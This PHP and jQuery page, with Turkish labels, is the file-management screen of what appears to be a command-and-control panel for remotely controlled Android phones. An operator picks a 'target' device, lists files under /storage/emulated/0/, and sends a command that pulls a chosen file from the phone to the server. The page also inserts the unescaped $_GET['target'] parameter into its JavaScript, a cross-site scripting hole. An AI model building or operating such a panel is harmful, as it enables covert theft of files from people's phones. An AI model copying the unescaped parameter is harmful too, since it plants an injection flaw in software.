<?php 
require_once 'module_controller.php';
?>
    <div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">
                <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
                <div class="col-md-10 col-lg-offset-0">

                </div>

                <div class="row"></div>
                <br><br>
                <legend>Dosya Yönetimi</legend>
                <div class="row">
                    <form class="form-horizontal col-md-8 col-lg-offset-1">
                        <fieldset>

                            <div class="form-group">
                                <label for="file-path-id" class="col-lg-2 control-label">File path</label>
                                <div class="col-lg-pull-12">
                                    <input class="form-control" id="file-path-id" placeholder="file full path" type="text">
                                </div>
                            </div>


                            <div class="form-group">
                                <label for="select" class="col-lg-2 control-label">File list</label>
                                <div class="col-lg-pull-12">
                                    <select size="15" id="selected-file-id" name="selected-file-id" class="form-control vacances">
                                        <option>/storage/emulated/0/</option>
                                    </select>
                                </div>
                            </div>

                            <div class="col-md-8 col-lg-offset-2">
                                <button id="list-file-id" name="list-file-id" type="button" class="btn btn-default">Dosyaları listele</button>
                                <button id="download-file-id" name="download-file-id" type="button" class="btn btn-default">Dosyayı İndir</button>
                            </div>




                        </fieldset>
                    </form>
                </div>
                <br><br>
            </div>
        </div>
    </div>

    <script>

        $("#selected-file-id").click(function() {

            $.each($("#selected-file-id option:selected"), function(){
                var selected_file = $(this).val();
                $("#file-path-id").val(selected_file);
            });
        });

        $("#command-sender-id").click(function() {
            var filePath = $("#file-path-id").val()+'';


            if (filePath.trim()!=''){

                var commands = {
                    send_command: true,
                    target:"<?php echo $_GET['target'];?>",
                    type: 'get_list_file',
                    value: {
                            "target_file_path": filePath
                        }
                };

                $.post( "commands.php", commands, function( data, err ) {
                    if (data.status){
                        Toastify({
                            text: "Komut gönderildi.!",
                            backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                            className: "info",
                        }).showToast();
                    } else {
                        Toastify({
                            text: "Komut başarısız.!",
                            backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                            className: "info",
                        }).showToast();
                    }

                }, "json");
            } else {
                Toastify({
                    text: "Lütfen alanları boş bırakmayınız...!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        });

        $("#download-file-id").click(function() {

                var filePath = $("#file-path-id").val()+'';


                if (filePath.trim()!=''){

                    var commands = {
                        send_command: true,
                        target:"<?php echo $_GET['target'];?>",
                        type: 'upload_file_path',
                        value: filePath
                    };

                    $.post( "commands.php", commands, function( data, err ) {
                        if (data.status){
                            Toastify({
                                text: "Komut gönderildi.!",
                                backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                                className: "info",
                            }).showToast();
                        } else {
                            Toastify({
                                text: "Komut başarısız.!",
                                backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                                className: "info",
                            }).showToast();
                        }

                    }, "json");
                } else {
                    Toastify({
                        text: "Lütfen alanları boş bırakmayınız...!",
                        backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                        className: "info",
                    }).showToast();
                }
        });


        $("#list-file-id").click(function() {

                var commands = {
                    show_file_path: true,
                    target:"<?php echo $_GET['target'];?>"
                };

                $.post( "commands.php", commands, function( data, err ) {
                    if (data){
                        Toastify({
                            text: "Komut gönderildi.!",
                            backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                            className: "info",
                        }).showToast();

                        $('#selected-file-id').empty();
                        $('#selected-file-id').html('');
                        $.each(data, function(i, item) {
                            $('#selected-file-id').append("<option>" + item + "</option>");
                        });

                    } else {
                        Toastify({
                            text: "Komut başarısız.!",
                            backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                            className: "info",
                        }).showToast();
                    }

                }, "json");

        });

    </script>
